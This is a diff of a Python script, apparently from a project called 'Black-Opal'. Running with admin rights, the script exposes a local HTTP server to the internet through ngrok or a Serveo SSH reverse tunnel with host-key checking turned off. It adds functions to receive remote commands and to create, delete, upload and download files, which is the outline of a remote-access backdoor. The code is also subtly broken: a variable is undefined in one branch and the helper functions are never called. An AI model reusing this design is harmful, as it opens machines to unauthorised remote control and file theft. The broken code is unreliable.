@@ -2,6 +2,7 @@ import os
 import subprocess
 import requests
 import time
+import argparse
 from pyuac import main_requires_admin
 
 @main_requires_admin
@@ -13,53 +14,94 @@ def main():
     # Step 2: Open up a local server using py -m http.server
     http_server_process = subprocess.Popen(["py", "-m", "http.server", "80"])
     time.sleep(2) # Give the server time to start up
+    
+    # Step 3: Use ngrok or Serveo to expose that server publicly
+    parser = argparse.ArgumentParser(description='Expose a local server using Ngrok or Serveo')
+    parser.add_argument('--tunnel', dest='tunnel', required=True, choices=['ngrok', 'serveo'], help='tunneling service to use (ngrok or serveo)')
+    parser.add_argument('--subdomain', dest='subdomain', required=True, help='Subdomain to use for Serveo tunnel. Leave blank if you are using ngrok')
+    parser.add_argument('-p', dest='port', required=True, help='port for connection')
+    args = parser.parse_args()
 
-    # Step 3: Use ngrok to expose that server publicly
-    ngrok_process = subprocess.Popen(["C:/Users/cyn0v/Documents/GitHub/Black-Opal/Resources/ngrok.exe", "http", "80"])
-    time.sleep(2) # Give ngrok time to start up
+    if args.tunnel == 'ngrok':
+        ngrok_process = subprocess.Popen(["C:/Users/cyn0v/Documents/GitHub/Black-Opal/Resources/ngrok.exe", "http", "80"])
+        time.sleep(2) # Give ngrok time to start up
+        ngrok_url = requests.get("http://localhost:4040/api/tunnels").json()["tunnels"][0]["public_url"]
+        print(f"Public URL: {ngrok_url}")
 
-    ngrok_url = requests.get("http://localhost:4040/api/tunnels").json()["tunnels"][0]["public_url"]
-    print(f"Public URL: {ngrok_url}")
+    elif args.tunnel == 'serveo':
+        # Step 1: Check if ssh key exists, if not create one
+        ssh_folder = 'C:/Users/cyn0v/Documents/GitHub/Black-Opal/ssh/'
+        if not os.path.exists(ssh_folder):
+            os.makedirs(ssh_folder)
 
-    # Step 4: Create functions to wait for a command from another script through ngrok and make/delete/upload and download files
-    def wait_for_command():
-        """
-        Wait for a command from another script through ngrok
-        """
+        private_key_path = os.path.join(ssh_folder, "key.txt")
+        print(f"Private key path: {private_key_path}")
+        public_key_path = os.path.join(ssh_folder, "key.txt.pub")
+        known_hosts_path = os.path.join(ssh_folder, "known_hosts")
+
+        if not os.path.isfile(private_key_path) or not os.path.isfile(public_key_path):
+            os.system(f'ssh-keygen -t rsa -b 2048 -f {private_key_path} -q -N ""')
+
+        domain = "serveo.net"
+        # Step 2: Get Serveo subdomain
+        ssh_command = f"ssh -R {args.subdomain}:80:localhost:{args.port} -o ServerAliveInterval=60 -o ExitOnForwardFailure=yes -o StrictHostKeyChecking=no -i {private_key_path} serveo.net"
+        print(f"Running Serveo command: {ssh_command}")
+        serveo_process = subprocess.Popen(ssh_command, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE)
+
+        # Step 3: Wait for subdomain to be ready and print URL
         while True:
-            response = requests.get(f"{ngrok_url}/command")
-            if response.status_code == 200:
-                return response.text
+            output = serveo_process.stderr.readline().decode('utf-8').strip()
+            if output != "":
+                print(output)
+            if "Forwarding" in output:
+                print(f"Public URL: https://{args.subdomain}.{domain}")
+                print(f"Local URL: http://localhost:{args.port}")
+                break
+            elif "Connection refused" in output:
+                print("Error: Connection refused. Is the specified port open?")
+                break
+            elif "could not open directory" in output:
+                print("Error: Invalid directory specified.")
+                break
 
-    def make_file(file_name):
-        """
-        Create a file with the given file name
-        """
-        with open(file_name, "w") as f:
-            f.write("")
+        
 
-    def delete_file(file_name):
-        """
-        Delete the file with the given file name
-        """
-        os.remove(file_name)
+    # Step 4: Create functions to wait for a command from another script through the tunnel and make/delete/upload and download files
+    def wait_for_command():
+        # Wait for a command to be received
+        while True:
+            try:
+                r = requests.get("http://localhost:80/command")
+                command = r.text
+                if command:
+                    return command
+            except requests.exceptions.ConnectionError:
+                pass
+            time.sleep(1)
 
-    def upload_file(local_file_path, remote_file_path):
-        """
-        Upload a local file to a remote file path
-        """
-        files = {"file": open(local_file_path, "rb")}
-        response = requests.post(f"{ngrok_url}/upload/{remote_file_path}", files=files)
-        if response.status_code != 200:
-            print(f"Error uploading file: {response.text}")
-
-    def download_file(remote_file_path, local_file_path):
-        """
-        Download a remote file to a local file path
-        """
-        response = requests.get(f"{ngrok_url}/download/{remote_file_path}")
-        with open(local_file_path, "wb") as f:
-            f.write(response.content)
+    def make_file(filename, content):
+        # Create a file with the given filename and content
+        with open(filename, "w") as f:
+            f.write(content)
+        print(f"Created file '{filename}' with content: {content}")
+    
+    def delete_file(filename):
+        # Delete the file with the given filename
+        os.remove(filename)
+        print(f"Deleted file '{filename}'")
+    
+    def upload_file(local_filename, remote_filename):
+        # Upload the file with the given local filename to the server with the given remote filename
+        files = {'file': open(local_filename, 'rb')}
+        r = requests.post(f"{ngrok_url}/upload/{remote_filename}", files=files)
+        print(f"Uploaded file '{local_filename}' to '{remote_filename}' on the server with status code {r.status_code}")
+    
+    def download_file(remote_filename, local_filename):
+        # Download the file with the given remote filename from the server and save it locally with the given filename
+        r = requests.get(f"{ngrok_url}/download/{remote_filename}")
+        with open(local_filename, 'wb') as f:
+            f.write(r.content)
+        print(f"Downloaded file '{remote_filename}' from the server to '{local_filename}' with status code {r.status_code}")
 
 if __name__ == "__main__":
     main()
